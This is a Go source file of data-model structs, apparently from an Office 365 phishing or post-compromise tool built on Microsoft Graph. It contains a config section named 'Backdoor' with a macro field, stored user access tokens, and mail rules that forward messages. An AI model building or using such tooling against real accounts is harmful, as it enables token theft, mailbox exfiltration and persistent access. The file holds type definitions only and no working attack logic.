package model

import "time"

type Config struct {
	Server struct{
		Host string
		ExternalPort int
		Certificate string
		Key string
		InternalPort int
	}
	Keywords struct{
		Outlook string
		Onedrive string
		Onenote string

	}
	Backdoor struct{
		Enabled bool
		Macro string
	}
}

type RecentFiles struct {
	OdataContext string `json:"@odata.context"`
	Value        []struct {
		OdataType string `json:"@odata.type"`
		ID        string `json:"id"`
		Name      string `json:"name"`
		WebURL    string `json:"webUrl"`
	} `json:"value"`
}


// Used for authenticated users
type User struct {
	Id string
	DisplayName string
	Mail string
	JobTitle string
	UserPrincipalName string
	AccessToken string
	AccessTokenActive int
}

// Used for retrieved users
type ADUsers struct {
	OdataContext string `json:"@odata.context"`
	OdataNextLink string `json:"@odata.nextLink"`
	Value        []struct {
    ID                string   `json:"id"`
    BusinessPhones    []string `json:"businessPhones"`
    DisplayName       string   `json:"displayName"`
    GivenName         string   `json:"givenName"`
    Mail              string   `json:"mail"`
    MobilePhone       string   `json:"mobilePhone"`
    PreferredLanguage string   `json:"preferredLanguage"`
    Surname           string   `json:"surname"`
    UserPrincipalName string   `json:"userPrincipalName"`
	} `json:"value"`
}

type ADUser struct {
  ID                string   `json:"id"`
  BusinessPhones    []string `json:"businessPhones"`
  DisplayName       string   `json:"displayName"`
  GivenName         string   `json:"givenName"`
  Mail              string   `json:"mail"`
  MobilePhone       string   `json:"mobilePhone"`
  PreferredLanguage string   `json:"preferredLanguage"`
  Surname           string   `json:"surname"`
  UserPrincipalName string   `json:"userPrincipalName"`
}

type Mail struct{
	Id string
	User string
	Subject string
	SenderEmail string
	SenderName string
	HasAttachments bool
	BodyPreview string
	BodyType string
	BodyContent string

}

type Rule struct {
	DisplayName string `json:"displayName"`
	Sequence    int    `json:"sequence"`
	IsEnabled   bool   `json:"isEnabled"`
	Conditions  struct {
		SenderContains []string `json:"senderContains"`
	} `json:"conditions"`
	Actions struct {
		ForwardTo []struct {
			EmailAddress struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"forwardTo"`
		StopProcessingRules bool `json:"stopProcessingRules"`
	} `json:"actions"`
}


type Messages struct {
	OdataContext string `json:"@odata.context"`
	OdataNextLink string `json:"@odata.nextLink"`
	Value        []struct {
		OdataEtag                  string        `json:"@odata.etag"`
		ID                         string        `json:"id"`
		CreatedDateTime            time.Time     `json:"createdDateTime"`
		LastModifiedDateTime       time.Time     `json:"lastModifiedDateTime"`
		ChangeKey                  string        `json:"changeKey"`
		Categories                 []interface{} `json:"categories"`
		ReceivedDateTime           time.Time     `json:"receivedDateTime"`
		SentDateTime               time.Time     `json:"sentDateTime"`
		HasAttachments             bool          `json:"hasAttachments"`
		InternetMessageID          string        `json:"internetMessageId"`
		Subject                    string        `json:"subject"`
		BodyPreview                string        `json:"bodyPreview"`
		Importance                 string        `json:"importance"`
		ParentFolderID             string        `json:"parentFolderId"`
		ConversationID             string        `json:"conversationId"`
		IsDeliveryReceiptRequested interface{}   `json:"isDeliveryReceiptRequested"`
		IsReadReceiptRequested     bool          `json:"isReadReceiptRequested"`
		IsRead                     bool          `json:"isRead"`
		IsDraft                    bool          `json:"isDraft"`
		WebLink                    string        `json:"webLink"`
		InferenceClassification    string        `json:"inferenceClassification"`
		Body                       struct {
			ContentType string `json:"contentType"`
			Content     string `json:"content"`
		} `json:"body"`
		Sender struct {
			EmailAddress struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"sender"`
		From struct {
			EmailAddress struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"from"`
		ToRecipients []struct {
			EmailAddress struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"toRecipients"`
		CcRecipients  []interface{} `json:"ccRecipients"`
		BccRecipients []interface{} `json:"bccRecipients"`
		ReplyTo       []interface{} `json:"replyTo"`
		Flag          struct {
			FlagStatus string `json:"flagStatus"`
		} `json:"flag"`
	} `json:"value"`
}

type Page struct{
	Title string
	Email string
	UserList []User
	ADUserList []ADUser
	EmailList []Mail
	FileList []string
	Mail Mail
}

type Rules struct {
	OdataContext string `json:"@odata.context"`
	Value        []struct {
		ID          string `json:"id"`
		DisplayName string `json:"displayName"`
		Sequence    int    `json:"sequence"`
		IsEnabled   bool   `json:"isEnabled"`
		HasError    bool   `json:"hasError"`
		IsReadOnly  bool   `json:"isReadOnly"`
		Conditions  struct {
			SenderContains []string `json:"senderContains"`
		} `json:"conditions"`
		Actions struct {
			StopProcessingRules bool `json:"stopProcessingRules"`
			ForwardTo           []struct {
				EmailAddress struct {
					Name    string `json:"name"`
					Address string `json:"address"`
				} `json:"emailAddress"`
			} `json:"forwardTo"`
		} `json:"actions"`
	} `json:"value"`
}

type Drives struct {
	OdataContext string `json:"@odata.context"`
	Value        []struct {
		CreatedDateTime      time.Time `json:"createdDateTime"`
		Description          string    `json:"description"`
		ID                   string    `json:"id"`
		LastModifiedDateTime time.Time `json:"lastModifiedDateTime"`
		Name                 string    `json:"name"`
		WebURL               string    `json:"webUrl"`
		DriveType            string    `json:"driveType"`
		CreatedBy            struct {
			User struct {
				DisplayName string `json:"displayName"`
			} `json:"user"`
		} `json:"createdBy"`
		LastModifiedBy struct {
			User struct {
				Email       string `json:"email"`
				ID          string `json:"id"`
				DisplayName string `json:"displayName"`
			} `json:"user"`
		} `json:"lastModifiedBy"`
		Owner struct {
			User struct {
				Email       string `json:"email"`
				ID          string `json:"id"`
				DisplayName string `json:"displayName"`
			} `json:"user"`
		} `json:"owner"`
		Quota struct {
			Deleted   int    `json:"deleted"`
			Remaining int64  `json:"remaining"`
			State     string `json:"state"`
			Total     int64  `json:"total"`
			Used      int    `json:"used"`
		} `json:"quota"`
	} `json:"value"`
}
type Files struct {
	OdataContext  string `json:"@odata.context"`
	OdataNextLink string `json:"@odata.nextLink"`
	Value         []struct {
		OdataType            string    `json:"@odata.type"`
		CreatedDateTime      time.Time `json:"createdDateTime"`
		ID                   string    `json:"id"`
		LastModifiedDateTime time.Time `json:"lastModifiedDateTime"`
		Name                 string    `json:"name"`
		WebURL               string    `json:"webUrl"`
		Size                 int       `json:"size"`
		ParentReference      struct {
			DriveID   string `json:"driveId"`
			DriveType string `json:"driveType"`
			ID        string `json:"id"`
		} `json:"parentReference"`
		File struct {
			MimeType string `json:"mimeType"`
		} `json:"file,omitempty"`
		FileSystemInfo struct {
			CreatedDateTime      time.Time `json:"createdDateTime"`
			LastModifiedDateTime time.Time `json:"lastModifiedDateTime"`
		} `json:"fileSystemInfo"`
		SearchResult struct {
		} `json:"searchResult"`
		Folder struct {
			ChildCount int `json:"childCount"`
		} `json:"folder,omitempty"`
	} `json:"value"`
}

type DriveItem struct {
	OdataContext              string    `json:"@odata.context"`
	MicrosoftGraphDownloadURL string    `json:"@microsoft.graph.downloadUrl"`
	CreatedDateTime           time.Time `json:"createdDateTime"`
	ETag                      string    `json:"eTag"`
	ID                        string    `json:"id"`
	LastModifiedDateTime      time.Time `json:"lastModifiedDateTime"`
	Name                      string    `json:"name"`
	WebURL                    string    `json:"webUrl"`
	CTag                      string    `json:"cTag"`
	Size                      int       `json:"size"`
	CreatedBy                 struct {
		Application struct {
			ID          string `json:"id"`
			DisplayName string `json:"displayName"`
		} `json:"application"`
		User struct {
			Email       string `json:"email"`
			ID          string `json:"id"`
			DisplayName string `json:"displayName"`
		} `json:"user"`
	} `json:"createdBy"`
	LastModifiedBy struct {
		Application struct {
			ID          string `json:"id"`
			DisplayName string `json:"displayName"`
		} `json:"application"`
		User struct {
			Email       string `json:"email"`
			ID          string `json:"id"`
			DisplayName string `json:"displayName"`
		} `json:"user"`
	} `json:"lastModifiedBy"`
	ParentReference struct {
		DriveID   string `json:"driveId"`
		DriveType string `json:"driveType"`
		ID        string `json:"id"`
		Path      string `json:"path"`
	} `json:"parentReference"`
	File struct {
		MimeType string `json:"mimeType"`
	} `json:"file"`
	FileSystemInfo struct {
		CreatedDateTime      time.Time `json:"createdDateTime"`
		LastModifiedDateTime time.Time `json:"lastModifiedDateTime"`
	} `json:"fileSystemInfo"`
}
